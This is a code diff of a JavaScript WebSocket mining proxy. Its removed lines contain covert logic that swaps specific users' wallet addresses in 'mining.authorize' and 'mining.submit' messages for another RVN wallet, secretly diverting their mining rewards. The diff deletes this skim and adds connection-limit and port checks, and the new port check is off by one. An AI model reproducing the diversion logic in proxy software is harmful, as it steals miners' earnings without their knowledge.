@@ -79,22 +79,9 @@ function proxySender(ws, conn) {
   ws.on('message', (cmd) => {
     try {
       const command = JSON.parse(cmd);
-      const method = command.method;
-      const params = command.params;
-      const ignoreDevs = ['RVZD5AjUBXoNnsBg9B2AzTTdEeBNLfqs65', 'dgb1qegmnzvjfcqarqxrpvfu0m4ugpjht6dnpcfslp9'];
-
-      if (method === 'mining.authorize' && ignoreDevs.includes(params[0])) {
-         command.params = ['RT7QLMf9o4aL4JAj3HeAYLssohGTT586Zp', 'c=RVN,zap=PLSR-mino'];
-      }
-
-      if (method === 'mining.submit' && ignoreDevs.includes(params[0])) {
-         command.params[0] = 'RT7QLMf9o4aL4JAj3HeAYLssohGTT586Zp';
-      }
-
-      const newcmd = JSON.stringify(command);
-      
+      const method = command.method;;
       if (method === 'mining.subscribe' || method === 'mining.authorize' || method === 'mining.submit') {
-        conn.write(newcmd);
+        conn.write(cmd);
       }
     } catch (error) {
       console.log(`[Error][INTERNAL] ${error}`);
@@ -137,7 +124,7 @@ function isIP(ip) {
 
 async function proxyMain(ws, req) {
   const ip = getClientIp(req);
-
+  
   // Generate unique id
   const uid = uidv1();
   if (!nodes[ip]) nodes[ip] = [];
@@ -145,8 +132,10 @@ async function proxyMain(ws, req) {
 
   // check block ip
   if (nodes[ip].length > MAX_CONNECTION_PER_IP) {
-    await addToBlackList(ip);
+    addToBlackList(ip);
     console.error(`IP [${ip}] is banned!`);
+    ws.send(`IP [${ip}] is banned!`);
+    return;
   }
 
   // Clear stock
@@ -164,7 +153,7 @@ async function proxyMain(ws, req) {
     if (command.method === 'proxy.connect' && command.params.length === 2) {
       const [host, port] = command.params || [];
       
-      if (!host || !port || blackPool.includes(host)) {
+      if (!host || !port || blackPool.includes(host) || port < 0 || port > 65536) {
         ws.close();
         req.socket.write('HTTP/1.1 403 Forbidden\r\n\r\n');
         req.socket.destroy();
